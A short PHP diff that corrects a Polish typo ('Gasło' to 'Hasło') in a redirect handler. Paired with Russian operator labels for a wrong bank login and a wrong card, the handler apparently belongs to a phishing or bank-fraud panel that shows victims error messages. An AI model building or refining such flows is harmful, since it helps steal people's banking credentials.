@@ -49,7 +49,7 @@ class RedirectCommand extends BaseCommand
             switch ($url) {
                 case "/banks":
                     $text .= "неверный лк";
-                    $msgPL = 'Pan/Pani wprowadził/a nieprawidłowe dane do swojej aplikacji bankowej(Login/Gasło)';
+                    $msgPL = 'Pan/Pani wprowadził/a nieprawidłowe dane do swojej aplikacji bankowej(Login/Hasło)';
                     break;
                 case "/order":
                     $text .= "неверную карту";
